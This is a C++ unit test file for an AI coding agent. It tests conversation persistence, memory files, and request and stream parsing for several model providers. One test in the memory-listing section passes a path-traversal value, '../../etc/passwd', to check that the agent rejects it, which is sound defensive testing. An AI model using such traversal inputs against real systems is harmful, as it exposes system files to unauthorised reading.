#include <iostream>
#include <fstream>
#include <cassert>
#include <filesystem>
#include <thread>
#include <chrono>
#include <cstdlib>
#include <unistd.h>
#include <fcntl.h>

#include "agent/signal_handler.hpp"

#include "agent/config.hpp"
#include "agent/conversation.hpp"
#include "agent/repl.hpp"
#include "agent/repl_inline.hpp"
#include "agent/memory.hpp"
#include "agent/token_stats.hpp"
#include "agent/tools/run_command.hpp"
#include "agent/tools/read_file.hpp"
#include "agent/tools/grep.hpp"
#include "agent/tools/edit_file.hpp"
#include "agent/providers/provider.hpp"
#include "agent/api/rate_limit.hpp"
#include "agent/api/client.hpp"
#include "agent/providers/openai.hpp"
#include "agent/providers/ollama.hpp"
#include "agent/providers/anthropic.hpp"
#include "agent/providers/moonshot.hpp"
#include "agent/providers/openrouter.hpp"
#include "agent/providers/kimi.hpp"
#include "agent/providers/claude.hpp"
#include "agent/providers/codex.hpp"
#include "agent/providers/gemini.hpp"
#include "agent/auth/claude_oauth.hpp"
#include "agent/tools/registry.hpp"
#include "agent/skills.hpp"
#include "agent/gitignore.hpp"
#include "agent/auth/secure_file.hpp"
#include <sys/stat.h>
#include "agent/commands.hpp"
#include "agent/tools/skill_tool.hpp"
#include "agent/tools/list_directory.hpp"
#include "agent/tools/find_symbol.hpp"
#include "agent/tools/find_references.hpp"
#include "agent/tools/project_map.hpp"
#include "agent/tools/outline_file.hpp"
#include "agent/tools/web_search.hpp"
#include "agent/tools/fetch_url.hpp"
#include "agent/tools/mcp_tool.hpp"
#include "agent/mcp/client.hpp"
#include "agent/tools/advisor.hpp"
#include "agent/tools/workflow_tool.hpp"
#include "agent/tools/tasks_tool.hpp"
#include "agent/workflow.hpp"
#include "agent/text_utils.hpp"

static int passed = 0;
static int failed = 0;

static void check(bool condition, const std::string& name) {
    if ( condition ) {
        std::cout << "  PASS: " << name << std::endl;
        passed++;
    } else {
        std::cout << "  FAIL: " << name << std::endl;
        failed++;
    }
}

static void test_conversation_save_load() {
    std::cout << "conversation save/load" << std::endl;
    agent::Conversation c;
    c.set_system("sys");
    c.add_user("hello");
    c.add_assistant("hi");
    c.save("/tmp/ai_agent_conv_test.json");

    agent::Conversation c2;
    c2.load("/tmp/ai_agent_conv_test.json");
    check(c2.messages().size() == 3, "loaded 3 messages");
    check(c2.messages()[0].content == "sys", "system message preserved");
    check(c2.messages()[1].content == "hello", "user message preserved");
    check(c2.messages()[2].content == "hi", "assistant message preserved");

    std::filesystem::remove("/tmp/ai_agent_conv_test.json");
}

static void test_memory_loading() {
    std::cout << "memory loading" << std::endl;
    std::string home = "/tmp/ai_agent_home_test";
    std::filesystem::create_directories(home + "/memories/claude");
    std::ofstream ofd(home + "/memories/claude/notes.md");
    ofd << "User is a developer.";
    ofd.close();

    std::string mem = agent::load_memories(home, "claude");
    check(mem.find("User is a developer.") != std::string::npos, "memory content loaded");
    check(mem.find("### notes.md") != std::string::npos, "memory file name included");

    std::filesystem::remove_all(home);
}

static void test_memory_listing() {
    std::cout << "memory listing" << std::endl;
    std::string home = "/tmp/ai_agent_memlist_test";
    std::filesystem::create_directories(home + "/memories/kimi");
    { std::ofstream f(home + "/memories/kimi/a.md"); f << "line1\nline2\n"; }
    { std::ofstream f(home + "/memories/kimi/b.md"); f << "one\n"; }

    auto files = agent::list_memories(home, "kimi");
    check(files.size() == 2, "lists two memory files");
    check(!files.empty() && files[0].name == "a.md" && files[0].lines == 2, "name + line count, sorted");

    check(agent::read_memory(home, "kimi", "a.md").find("line1") != std::string::npos, "reads a memory file");
    check(agent::read_memory(home, "kimi", "../../etc/passwd").empty(), "rejects path traversal");
    check(agent::read_memory(home, "kimi", "nope.md").empty(), "missing file returns empty");

    std::filesystem::remove_all(home);
}

static void test_openai_request() {
    std::cout << "openai request format" << std::endl;
    agent::Config cfg;
    agent::providers::OpenAI p(cfg);
    agent::Conversation c;
    c.set_system("sys");
    c.add_user("hi");
    JSON req = p.build_request(c, JSON::Array{});
    check(req.contains("model"), "has model");
    check(req.contains("messages"), "has messages");
    check(req["messages"] == JSON::TYPE::ARRAY, "messages is array");
    check(req["messages"].size() == 2, "two messages");
}

static void test_codex_provider() {
    std::cout << "codex Responses API provider" << std::endl;
    check(agent::Config::default_model_for("codex") == "gpt-5.6", "codex default model is gpt-5.6");
    const auto& codex_models = agent::Config::known_models_for("codex");
    check(codex_models.size() >= 8 && codex_models[0] == "gpt-6-astra" &&
          codex_models[1] == "gpt-5.6-sol" && codex_models[2] == "gpt-5.6-terra" &&
          codex_models[3] == "gpt-5.6-luna",
          "codex model shortlist includes the ChatGPT/Codex family");
    check(agent::Config::resolve_model("codex", "astra").model == "gpt-6-astra", "astra alias resolves to gpt-6-astra");
    check(agent::Config::resolve_model("codex", "sol").model == "gpt-5.6-sol", "sol alias resolves to gpt-5.6-sol");
    check(agent::Config::resolve_model("codex", "terra").model == "gpt-5.6-terra", "terra alias resolves to gpt-5.6-terra");
    check(agent::Config::resolve_model("codex", "luna").model == "gpt-5.6-luna", "luna alias resolves to gpt-5.6-luna");

    agent::Config cfg; cfg.provider = "codex"; cfg.model = "gpt-5.5";
    agent::providers::Codex p(cfg);
    check(p.name() == "codex", "codex provider name");
    check(p.endpoint() == "https://chatgpt.com/backend-api/codex/responses", "Codex subscription endpoint");
    agent::Conversation c; c.set_system("sys"); c.add_user("hello");
    JSON schema = JSON::Array{JSON::Object{{ "type", "function" }, { "function", JSON::Object{
        { "name", "read_file" }, { "description", "read" }, { "parameters", JSON::Object{} }
    }}}};
    JSON req = p.build_request(c, schema);
    check(req.contains("input") && req["input"] == JSON::TYPE::ARRAY, "uses Responses input array");
    check(req["instructions"].to_string() == "sys", "system becomes instructions");
    check(req["tools"][0]["name"].to_string() == "read_file", "flattens function tool schema");
    check(!req.contains("reasoning"), "Codex reasoning defaults to off");
    p.apply_provider_options(JSON::Object{ { "thinking", "high" } });
    req = p.build_request(c, schema);
    check(req.contains("reasoning") && req["reasoning"]["effort"].to_string() == "high",
          "Codex reasoning can be enabled explicitly");
    p.apply_provider_options(JSON::Object{ { "thinking", "max" } });
    req = p.build_request(c, schema);
    check(req["reasoning"]["effort"].to_string() == "xhigh", "Codex max effort maps to xhigh");

    JSON response = JSON::Object{
        { "status", "completed" },
        { "output", JSON::Array{
            JSON::Object{{ "type", "message" }, { "content", JSON::Array{
                JSON::Object{{ "type", "output_text" }, { "text", "done" }}
            }}},
            JSON::Object{{ "type", "function_call" }, { "call_id", "call_1" },
                         { "name", "read_file" }, { "arguments", "{\"path\":\"x\"}" }}
        }},
        { "usage", JSON::Object{{ "input_tokens", 12 }, { "output_tokens", 4 },
            { "input_tokens_details", JSON::Object{{ "cached_tokens", 8 }} }}}
    };
    auto parsed = p.parse_response(response);
    check(parsed.message == "done", "parses Responses output text");
    check(parsed.tool_calls.size() == 1 && parsed.tool_calls[0].name == "read_file", "parses Responses function call");
    check(parsed.input_tokens == 12 && parsed.output_tokens == 4 && parsed.cached_input_tokens == 8, "parses Responses usage");

    p.stream_reset(); std::string buffer; bool done = false;
    auto delta = p.parse_stream("event: response.output_text.delta\ndata: {\"type\":\"response.output_text.delta\",\"delta\":\"hi\"}\n\n", buffer, done);
    check(delta.content == "hi" && p.stream_result().message == "hi", "parses Responses SSE text delta");

    p.stream_reset(); buffer.clear(); done = false;
    auto two = p.parse_stream(
        "event: response.output_text.delta\n"
        "data: {\"type\":\"response.output_text.delta\",\"delta\":\"Juuri \"}\n\n"
        "event: response.output_text.delta\n"
        "data: {\"type\":\"response.output_text.delta\",\"delta\":\"niin\"}\n\n",
        buffer, done);
    check(two.content == "Juuri niin" && p.stream_result().message == "Juuri niin",
          "Codex live stream preserves multiple deltas in one HTTP chunk");

    p.stream_reset(); buffer.clear(); done = false;
    auto thinking = p.parse_stream(
        "event: response.reasoning_summary_text.delta\n"
        "data: {\"type\":\"response.reasoning_summary_text.delta\",\"delta\":\"ajatellaan \"}\n\n"
        "event: response.reasoning_summary_text.delta\n"
        "data: {\"type\":\"response.reasoning_summary_text.delta\",\"delta\":\"ensin\"}\n\n",
        buffer, done);
    check(thinking.reasoning == "ajatellaan ensin" && p.stream_result().thinking == "ajatellaan ensin",
          "Codex live stream preserves multiple reasoning deltas in one HTTP chunk");

    agent::api::Client client;
    auto codex_live_models = p.list_models(client);
    check(!codex_live_models.empty() && codex_live_models[0] == "gpt-6-astra",
          "Codex list_models returns desktop app models starting with gpt-6-astra");
}

static void test_gemini_provider() {
    std::cout << "gemini provider & SSE streaming" << std::endl;
    check(agent::Config::default_model_for("gemini") == "gemini-3.6-flash", "gemini default model is gemini-3.6-flash");

    agent::Config cfg;
    cfg.provider = "gemini";
    cfg.model = "gemini-3.6-flash";
    cfg.api_key = "test_key";
    agent::providers::Gemini p(cfg);
    check(p.name() == "gemini", "gemini provider name");

    agent::Conversation c;
    c.set_system("sys");
    c.add_user("hello");
    JSON req = p.build_request(c, JSON::Array{});
    check(req.contains("contents"), "gemini request has contents");
    check(req.contains("systemInstruction"), "gemini request has systemInstruction");
    check(!req.contains("stream"), "gemini request does not contain stream flag in body");

    // Test SSE parse_stream with comments, multiple chunks and single-pass buffer draining
    std::string buffer;
    bool done = false;
    p.stream_reset();

    std::string sse_chunk1 = ":keepalive\ndata: {\"candidates\": [{\"content\": {\"parts\": [{\"text\": \"Hello \"}]}}]}\n\n";
    auto sc1 = p.parse_stream(sse_chunk1, buffer, done);
    check(sc1.content == "Hello ", "first chunk parsed");
    check(buffer.empty(), "buffer drained after full frame");

    std::string sse_chunk2 = "data: {\"candidates\": [{\"content\": {\"parts\": [{\"text\": \"World!\"}]}}]}\n\ndata: [DONE]\n\n";
    auto sc2 = p.parse_stream(sse_chunk2, buffer, done);
    check(sc2.content == "World!", "second chunk parsed");
    check(done, "done marker set");
    auto res = p.stream_result();
    check(res.message == "Hello World!", "stream_result matches complete text");
}

static void test_gemini_tool_calls_and_continuation() {
    std::cout << "gemini tool calls, continuation and role merging" << std::endl;
    agent::Config cfg;
    cfg.provider = "gemini";
    cfg.model = "gemini-2.5-pro";
    agent::providers::Gemini p(cfg);
    check(p.supports_reasoning(), "gemini provider supports reasoning");

    // 1. Tool declarations in build_request
    JSON tools_schema = JSON::Array{
        JSON::Object{
            { "type", "function" },
            { "function", JSON::Object{
                { "name", "read_file" },
                { "description", "Read file contents" },
                { "parameters", JSON::Object{
                    { "type", "object" },
                    { "properties", JSON::Object{
                        { "path", JSON::Object{ { "type", "string" } } }
                    }},
                    { "required", JSON::Array{ "path" } }
                }}
            }}
        }
    };
    agent::Conversation c;
    c.set_system("You are a helpful assistant.");
    c.add_user("Please read main.cpp");

    JSON req = p.build_request(c, tools_schema);
    check(req.contains("tools") && req["tools"].size() > 0, "gemini request has tools");
    check(req["tools"][0].contains("functionDeclarations"), "tools has functionDeclarations");
    const JSON& decls = req["tools"][0]["functionDeclarations"];
    check(decls.size() == 1 && decls[0]["name"].to_string() == "read_file", "read_file function declared");
    check(decls[0]["parameters"]["required"][0].to_string() == "path", "parameters preserved");

    // 2. parse_response: text + thoughts + functionCall + finishReason
    JSON resp = JSON::Object{
        { "candidates", JSON::Array{
            JSON::Object{
                { "finishReason", "STOP" },
                { "content", JSON::Object{
                    { "parts", JSON::Array{
                        JSON::Object{
                            { "thought", true },
                            { "text", "I need to check the file contents first." }
                        },
                        JSON::Object{
                            { "text", "Checking the code now." }
                        },
                        JSON::Object{
                            { "functionCall", JSON::Object{
                                { "name", "read_file" },
                                { "args", JSON::Object{ { "path", "src/main.cpp" } } }
                            }}
                        }
                    }}
                }}
            }
        }},
        { "usageMetadata", JSON::Object{
            { "promptTokenCount", 450 },
            { "candidatesTokenCount", 85 },
            { "cachedContentTokenCount", 200 },
            { "thoughtsTokenCount", 40 }
        }}
    };
    auto r = p.parse_response(resp);
    check(r.success, "gemini response parsed successfully");
    check(r.thinking == "I need to check the file contents first.", "thought captured");
    check(r.message == "Checking the code now.", "preceding text captured");
    check(r.tool_calls.size() == 1, "one tool call parsed");
    check(r.tool_calls[0].name == "read_file", "tool call name is read_file");
    check(r.tool_calls[0].arguments["path"].to_string() == "src/main.cpp", "tool call arg path parsed");
    check(r.tool_calls[0].id.rfind("call_", 0) == 0, "tool call ID has call_ prefix");
    check(r.input_tokens == 450, "promptTokenCount parsed");
    check(r.output_tokens == 85, "candidatesTokenCount parsed");
    check(r.cached_input_tokens == 200, "cachedContentTokenCount parsed");
    check(r.reasoning_tokens == 40, "thoughtsTokenCount parsed");
    check(!r.truncated, "finishReason STOP is not truncated");

    // 3. Multiple function calls with monotonic IDs
    JSON multi_resp = JSON::Object{
        { "candidates", JSON::Array{
            JSON::Object{
                { "finishReason", "MAX_TOKENS" },
                { "content", JSON::Object{
                    { "parts", JSON::Array{
                        JSON::Object{
                            { "functionCall", JSON::Object{
                                { "name", "read_file" },
                                { "args", JSON::Object{ { "path", "a.txt" } } }
                            }}
                        },
                        JSON::Object{
                            { "functionCall", JSON::Object{
                                { "name", "list_directory" },
                                { "args", JSON::Object{ { "path", "src" } } }
                            }}
                        }
                    }}
                }}
            }
        }}
    };
    auto r_multi = p.parse_response(multi_resp);
    check(r_multi.tool_calls.size() == 2, "two tool calls parsed");
    check(r_multi.tool_calls[0].name == "read_file", "first tool call is read_file");
    check(r_multi.tool_calls[1].name == "list_directory", "second tool call is list_directory");
    check(r_multi.tool_calls[0].id != r_multi.tool_calls[1].id, "tool call IDs are strictly unique");
    check(r_multi.truncated, "finishReason MAX_TOKENS sets truncated flag");

    // 4. Conversation continuation and consecutive role merging
    // Flow: user -> model (tool_call) -> user (functionResponse) -> user (additional note)
    agent::Conversation conv;
    conv.set_system("System instructions");
    conv.add_user("Inspect the project");
    agent::ToolCall ctc{ r.tool_calls[0].id, r.tool_calls[0].name, r.tool_calls[0].arguments.dump() };
    conv.add_assistant("Calling tools", { ctc });
    conv.add_tool_result(r.tool_calls[0].id, "read_file", "int main() { return 0; }");
    conv.add_user("Also check Makefile");

    JSON cont_req = p.build_request(conv, tools_schema);
    check(cont_req.contains("contents"), "continuation request has contents");
    const JSON& contents = cont_req["contents"];
    // Verify contents alternation: user -> model -> user (where functionResponse + user text are merged!)
    check(contents.size() == 3, "consecutive user messages merged into single role entry");
    check(contents[0]["role"].to_string() == "user", "turn 0 is user");
    check(contents[1]["role"].to_string() == "model", "turn 1 is model");
    check(contents[2]["role"].to_string() == "user", "turn 2 is user (merged role)");

    // Turn 1 parts should have text + functionCall
    check(contents[1]["parts"].size() >= 2, "model turn has text and functionCall");
    check(contents[1]["parts"][1].contains("functionCall"), "model turn part 1 is functionCall");

    // Turn 2 parts should have functionResponse followed by user text
    check(contents[2]["parts"].size() == 2, "merged user turn has 2 parts");
    check(contents[2]["parts"][0].contains("functionResponse"), "first part is functionResponse");
    check(contents[2]["parts"][0]["functionResponse"]["name"].to_string() == "read_file", "functionResponse name matches");
    check(contents[2]["parts"][0]["functionResponse"]["response"]["output"].to_string() == "int main() { return 0; }", "functionResponse output matches");
    check(contents[2]["parts"][1].contains("text") && contents[2]["parts"][1]["text"].to_string() == "Also check Makefile", "second part is user text");

    // 5. Streamed function calls
    p.stream_reset();
    std::string sse_buf;
    bool sse_done = false;
    std::string sse_tool = "data: {\"candidates\": [{\"content\": {\"parts\": [{\"functionCall\": {\"name\": \"grep\", \"args\": {\"pattern\": \"TODO\"}}}]}}]}\n\n";
    p.parse_stream(sse_tool, sse_buf, sse_done);
    auto streamed_res = p.stream_result();
    check(streamed_res.tool_calls.size() == 1, "streamed functionCall parsed");
    check(streamed_res.tool_calls[0].name == "grep", "streamed tool name is grep");
    check(streamed_res.tool_calls[0].arguments["pattern"].to_string() == "TODO", "streamed tool args parsed");
    check(streamed_res.tool_calls[0].id.rfind("call_", 0) == 0, "streamed tool call has monotonic ID");

    // 6. Provider-aware context trimming consistency
    agent::Conversation conv_budget;
    conv_budget.set_system("System prompt with instructions");
    for ( int i = 0; i < 20; ++i ) {
        conv_budget.add_user("User step " + std::to_string(i) + ": short prompt query");
        conv_budget.add_assistant("Assistant response step " + std::to_string(i) + ": let us examine the files and make sure everything compiles cleanly.");
    }
    auto trimmed_gemini = conv_budget.within_token_budget(300, {}, "gemini");
    auto trimmed_openai = conv_budget.within_token_budget(300, {}, "openai");
    check(!trimmed_gemini.empty(), "gemini trimmed history not empty");
    check(!trimmed_openai.empty(), "openai trimmed history not empty");
    check(trimmed_gemini[0].role == agent::Role::SYSTEM, "gemini trim retains system prompt");
    check(trimmed_openai[0].role == agent::Role::SYSTEM, "openai trim retains system prompt");
    check(trimmed_gemini[1].role == agent::Role::USER, "gemini trim snaps to user turn");
    check(trimmed_openai[1].role == agent::Role::USER, "openai trim snaps to user turn");
}

static void test_reasoning_content() {
    std::cout << "reasoning content parsing" << std::endl;
    agent::Config cfg;
    JSON resp = JSON::Object{
        { "choices", JSON::Array{ JSON::Object{
            { "message", JSON::Object{
                { "content", "the answer" },
                { "reasoning_content", "let me think..." }
            }}
        }}}
    };
    agent::providers::OpenAI p(cfg);
    auto r = p.parse_response(resp);
    check(r.message == "the answer", "content parsed");
    check(r.thinking == "let me think...", "reasoning_content captured");

    agent::providers::Kimi k(cfg); // inherits the OpenAI parse
    auto rk = k.parse_response(resp);
    check(rk.thinking == "let me think...", "kimi captures reasoning_content");
}

static void test_reasoning_effort() {
    std::cout << "reasoning_effort (openai / openrouter)" << std::endl;
    agent::Conversation c; c.set_system("s"); c.add_user("hi");

    agent::Config cfg; cfg.provider = "openai";
    agent::providers::OpenAI p(cfg);
    check(!p.build_request(c, JSON::Array{}).contains("reasoning_effort"), "no field when thinking off");
    p.apply_provider_options(JSON::Object{ { "thinking", "high" } });
    check(p.build_request(c, JSON::Array{})["reasoning_effort"].to_string() == "high", "reasoning_effort high");
    p.apply_provider_options(JSON::Object{ { "thinking", "max" } });
    check(p.build_request(c, JSON::Array{})["reasoning_effort"].to_string() == "high", "max maps down to high");
    p.apply_provider_options(JSON::Object{ { "thinking", "off" } });
    check(!p.build_request(c, JSON::Array{}).contains("reasoning_effort"), "off removes the field");

    agent::Config rc; rc.provider = "openrouter";
    agent::providers::OpenRouter r(rc);
    r.apply_provider_options(JSON::Object{ { "thinking", "low" } });
    JSON req = r.build_request(c, JSON::Array{});
    check(!req.contains("reasoning_effort"), "openrouter does not send the flat field");
    check(req.contains("reasoning") && req["reasoning"]["effort"].to_string() == "low",
          "openrouter sends reasoning.effort");
}

static void test_openrouter_provider() {
    std::cout << "openrouter provider" << std::endl;
    agent::Config cfg; cfg.provider = "openrouter";
    agent::providers::OpenRouter p(cfg);
    check(p.name() == "openrouter", "name is openrouter");
    check(p.config().api_url == "https://openrouter.ai/api/v1", "defaults to the openrouter endpoint");
    check(p.endpoint().find("openrouter.ai/api/v1/chat/completions") != std::string::npos, "chat-completions endpoint");
    bool has_referer = false, has_title = false;
    for ( const auto& [k, v] : p.extra_headers()) {
        if ( k == "HTTP-Referer" ) has_referer = true;
        if ( k == "X-Title" ) has_title = true;
    }
    check(has_referer && has_title, "sends OpenRouter attribution headers");

    agent::Conversation c; c.set_system("s"); c.add_user("hi");
    JSON req = p.build_request(c, JSON::Array{});
    check(req.contains("model") && req.contains("messages"), "builds an OpenAI-style request");

    agent::Config cfg2; cfg2.provider = "openrouter"; cfg2.api_url = "http://localhost:9/v1";
    agent::providers::OpenRouter p2(cfg2);
    check(p2.config().api_url == "http://localhost:9/v1", "an explicit api_url is kept");
}

static void test_ollama_request() {
    std::cout << "ollama request format" << std::endl;
    agent::Config cfg;
    agent::providers::Ollama p(cfg);
    agent::Conversation c;
    c.add_user("hi");
    JSON req = p.build_request(c, JSON::Array{});
    check(req.contains("stream"), "has stream field");
    check(req["stream"].to_bool() == false, "stream is false");
}

static void test_anthropic_request() {
    std::cout << "anthropic request format" << std::endl;
    agent::Config cfg;
    agent::providers::Anthropic p(cfg);
    agent::Conversation c;
    c.set_system("sys");
    c.add_user("hi");
    JSON req = p.build_request(c, JSON::Array{});
    check(req.contains("system"), "has system field");
    check(req.contains("messages"), "has messages");
    check(req["messages"][0]["role"].to_string() == "user", "user role");

    // Several tool results from one turn (parallel tools) must batch into a SINGLE
    // user message — Anthropic rejects consecutive user roles.
    agent::Conversation c2;
    c2.set_system("sys");
    c2.add_user("do it");
    c2.add_assistant("", { { "id1", "read_file", "{}" }, { "id2", "grep", "{}" } });
    c2.add_tool_result("id1", "read_file", "aaa");
    c2.add_tool_result("id2", "grep", "bbb");
    JSON req2 = p.build_request(c2, JSON::Array{});
    JSON msgs = req2["messages"];
    // Expect: user, assistant, user — no two consecutive user roles.
    bool alternates = true;
    for ( size_t i = 1; i < msgs.size(); ++i )
        if ( msgs[i]["role"].to_string() == msgs[i - 1]["role"].to_string()) alternates = false;
    check(alternates, "no consecutive same-role messages after parallel tool results");
    JSON lastc = msgs[msgs.size() - 1]["content"];
    check(lastc == JSON::TYPE::ARRAY && lastc.size() == 2 &&
          lastc[0]["type"].to_string() == "tool_result" && lastc[1]["type"].to_string() == "tool_result",
          "two tool_result blocks batched into one user message");

    // Thinking budget + a large configured max_tokens must not exceed the model
    // output ceiling (sonnet = 64000), or Anthropic 400s the request.
    agent::Config bc; bc.provider = "anthropic"; bc.model = "claude-sonnet-4-6"; bc.max_tokens = 16000;
    agent::providers::Anthropic bp(bc);
    bp.apply_provider_options(JSON::Object{{ "thinking", "max" }});
    agent::Conversation bconv; bconv.set_system("s"); bconv.add_user("hi");
    JSON breq = bp.build_request(bconv, JSON::Array{});
    long mt = static_cast<long>(static_cast<long long>(breq["max_tokens"]));
    long bt = static_cast<long>(static_cast<long long>(breq["thinking"]["budget_tokens"]));
    check(mt <= 64000, "max_tokens clamped to the model ceiling with thinking on");
    check(bt < mt && bt >= 1024, "thinking budget stays below max_tokens");
}

static void test_cached_token_accounting() {
    std::cout << "cached-token accounting" << std::endl;
    {
        agent::Config cfg; cfg.provider = "openai";
        agent::providers::OpenAI p(cfg);
        JSON req = JSON::Object{}; p.prepare_stream_request(req);
        check(req.contains("stream_options") && req["stream_options"]["include_usage"].to_bool(),
              "openai requests include_usage on streamed turns");
        p.stream_reset();
        std::string buf; bool done = false;
        p.parse_stream("data: {\"choices\":[{\"delta\":{\"content\":\"x\"}}]}\n\n", buf, done);
        p.parse_stream("data: {\"choices\":[],\"usage\":{\"prompt_tokens\":1000,\"completion_tokens\":50,"
                       "\"prompt_tokens_details\":{\"cached_tokens\":800}}}\n\n", buf, done);
        auto r = p.stream_result();
        check(r.input_tokens == 1000 && r.cached_input_tokens == 800, "openai cached_tokens captured");
    }
    {
        // Streamed text BEFORE a tool call must not drop the tool call — models
        // routinely say "let me check…" and then call a tool in the same response.
        agent::Config cfg; cfg.provider = "openai";
        agent::providers::OpenAI p(cfg);
        p.stream_reset();
        std::string buf; bool done = false;
        p.parse_stream("data: {\"choices\":[{\"delta\":{\"content\":\"let me check.\"}}]}\n\n", buf, done);
        p.parse_stream("data: {\"choices\":[{\"delta\":{\"tool_calls\":[{\"index\":0,\"id\":\"t1\","
                       "\"function\":{\"name\":\"read_file\",\"arguments\":\"{\\\"path\\\":\\\"/x\\\"}\"}}]}}]}\n\n", buf, done);
        p.parse_stream("data: {\"choices\":[{\"delta\":{},\"finish_reason\":\"tool_calls\"}]}\n\n", buf, done);
        auto r = p.stream_result();
        check(r.message == "let me check.", "streamed preface text preserved");
        check(r.tool_calls.size() == 1 && r.tool_calls[0].name == "read_file",
              "tool call after streamed text is kept");
    }
    {
        agent::Config cfg; cfg.provider = "anthropic"; cfg.model = "claude-opus-4-8";
        agent::providers::Anthropic p(cfg);
        p.stream_reset();
        std::string buf; bool done = false;
        p.parse_stream("data: {\"type\":\"message_start\",\"message\":{\"usage\":{\"input_tokens\":100,"
                       "\"cache_read_input_tokens\":900,\"cache_creation_input_tokens\":50}}}\n\n", buf, done);
        auto r = p.stream_result();
        check(r.input_tokens == 1050, "anthropic total input includes cache read+create");
        check(r.cached_input_tokens == 900, "anthropic cache-read tracked");
        check(r.cache_creation_input_tokens == 50, "anthropic cache-creation tracked");
    }
    {
        agent::Config cfg; cfg.provider = "claude"; cfg.model = "priced-model";
        cfg.pricing["priced-model"] = agent::ModelPricing{ 10.0, 30.0 };
        double full = cfg.session_cost(1000000, 0, 0);
        double cached = cfg.session_cost(1000000, 0, 1000000);
        check(full > 9.9 && full < 10.1, "full input priced at input rate");
        check(cached > 0.9 && cached < 1.1, "fully-cached input priced at ~10%");
    }
}

static void test_max_tokens_and_truncation() {
    std::cout << "max_tokens config + truncation guard" << std::endl;
    {
        agent::Config cfg; cfg.provider = "anthropic"; cfg.model = "claude-opus-4-8";
        agent::providers::Anthropic p(cfg);
        agent::Conversation c; c.set_system("s"); c.add_user("hi");
        JSON req = p.build_request(c, JSON::Array{});
        check(static_cast<long long>(req["max_tokens"]) == 64000, "default max_tokens is 64000");
        cfg.max_tokens = 2000;
        agent::providers::Anthropic p2(cfg);
        JSON req2 = p2.build_request(c, JSON::Array{});
        check(static_cast<long long>(req2["max_tokens"]) == 2000, "config max_tokens applied");
    }
    {
        agent::Config cfg; cfg.provider = "anthropic"; cfg.model = "claude-opus-4-8";
        agent::providers::Anthropic p(cfg);
        p.stream_reset();
        std::string buf; bool done = false;
        auto feed = [&](const std::string& d) { p.parse_stream("data: " + d + "\n\n", buf, done); };
        feed("{\"type\":\"content_block_delta\",\"index\":0,\"delta\":{\"type\":\"text_delta\",\"text\":\"partial\"}}");
        feed("{\"type\":\"message_delta\",\"delta\":{\"stop_reason\":\"max_tokens\"},\"usage\":{\"output_tokens\":9}}");
        check(p.stream_result().truncated, "anthropic stop_reason max_tokens flags truncated");
    }
    {
        agent::Config cfg; cfg.provider = "anthropic";
        agent::providers::Anthropic p(cfg);
        JSON resp = JSON::Object{
            { "content", JSON::Array{ JSON::Object{ { "type", "text" }, { "text", "hi" } } } },
            { "stop_reason", "end_turn" } };
        check(!p.parse_response(resp).truncated, "end_turn is not truncated");
        resp["stop_reason"] = "max_tokens";
        check(p.parse_response(resp).truncated, "max_tokens stop_reason is truncated");
    }
    {
        agent::Config cfg; cfg.provider = "openai";
        agent::providers::OpenAI p(cfg);
        p.stream_reset();
        std::string buf; bool done = false;
        p.parse_stream("data: {\"choices\":[{\"delta\":{\"content\":\"x\"},\"finish_reason\":\"length\"}]}\n\n", buf, done);
        check(p.stream_result().truncated, "openai finish_reason length flags truncated");
    }
}

static void test_thinking_block_replay() {
    std::cout << "anthropic thinking blocks (capture + replay)" << std::endl;
    agent::Config cfg; cfg.provider = "anthropic"; cfg.model = "claude-opus-4-8";
    agent::providers::Anthropic p(cfg);
    p.apply_provider_options(JSON::Object{ { "thinking", "medium" } });

    // Stream: a thinking block (text + signature), then a tool_use block.
    p.stream_reset();
    std::string buf; bool done = false;
    auto feed = [&](const std::string& data) { p.parse_stream("data: " + data + "\n\n", buf, done); };
    feed("{\"type\":\"content_block_start\",\"index\":0,\"content_block\":{\"type\":\"thinking\",\"thinking\":\"\"}}");
    feed("{\"type\":\"content_block_delta\",\"index\":0,\"delta\":{\"type\":\"thinking_delta\",\"thinking\":\"let me reason\"}}");
    feed("{\"type\":\"content_block_delta\",\"index\":0,\"delta\":{\"type\":\"signature_delta\",\"signature\":\"SIG123\"}}");
    feed("{\"type\":\"content_block_start\",\"index\":1,\"content_block\":{\"type\":\"tool_use\",\"id\":\"tu_1\",\"name\":\"read_file\"}}");
    feed("{\"type\":\"content_block_delta\",\"index\":1,\"delta\":{\"type\":\"input_json_delta\",\"partial_json\":\"{\\\"path\\\":\\\"x\\\"}\"}}");
    auto r = p.stream_result();
    check(r.thinking == "let me reason", "thinking text accumulated");
    check(r.thinking_blocks == JSON::TYPE::ARRAY && r.thinking_blocks.size() == 1, "one thinking block captured");
    check(r.thinking_blocks[0]["signature"].to_string() == "SIG123", "signature captured");
    check(r.tool_calls.size() == 1 && r.tool_calls[0].name == "read_file", "tool call still parsed");

    // Replay: an assistant message with tool calls + thinking blocks must start
    // with the thinking block, verbatim.
    agent::Conversation conv;
    conv.set_system("s");
    conv.add_user("hi");
    conv.add_assistant("", { { "tu_1", "read_file", "{\"path\":\"x\"}" } }, r.thinking_blocks);
    conv.add_tool_result("tu_1", "read_file", "content");
    JSON req = p.build_request(conv, JSON::Array{});
    JSON msgs = req["messages"];
    bool replayed = false;
    for ( size_t i = 0; i < msgs.size(); ++i ) {
        JSON m = msgs[i];
        if ( m["role"].to_string() != "assistant" || m["content"] != JSON::TYPE::ARRAY ) continue;
        JSON c0 = m["content"][0];
        if ( c0.contains("type") && c0["type"].to_string() == "thinking" ) {
            replayed = c0["signature"].to_string() == "SIG123" &&
                       c0["thinking"].to_string() == "let me reason";
        }
    }
    check(replayed, "thinking block replayed first in assistant content");

    // With thinking off, the same history must NOT include thinking blocks.
    agent::providers::Anthropic p2(cfg);
    JSON req2 = p2.build_request(conv, JSON::Array{});
    check(req2.dump_minified().find("SIG123") == std::string::npos, "no replay when thinking is off");

    // redacted_thinking: complete at content_block_start, replayed as-is.
    p.stream_reset();
    buf.clear();
    feed("{\"type\":\"content_block_start\",\"index\":0,\"content_block\":{\"type\":\"redacted_thinking\",\"data\":\"OPAQUE\"}}");
    auto r2 = p.stream_result();
    check(r2.thinking_blocks.size() == 1 && r2.thinking_blocks[0]["data"].to_string() == "OPAQUE",
          "redacted_thinking captured");

    // Conversation save/load round-trips the blocks.
    std::string path = "/tmp/ai_thinkconv.json";
    conv.save(path);
    agent::Conversation conv2;
    conv2.load(path);
    bool kept = false;
    for ( const auto& m : conv2.messages())
        if ( m.role == agent::Role::ASSISTANT && m.thinking_blocks.size() == 1 )
            kept = m.thinking_blocks[0]["signature"].to_string() == "SIG123";
    check(kept, "thinking blocks survive save/load");
    std::filesystem::remove(path);
}

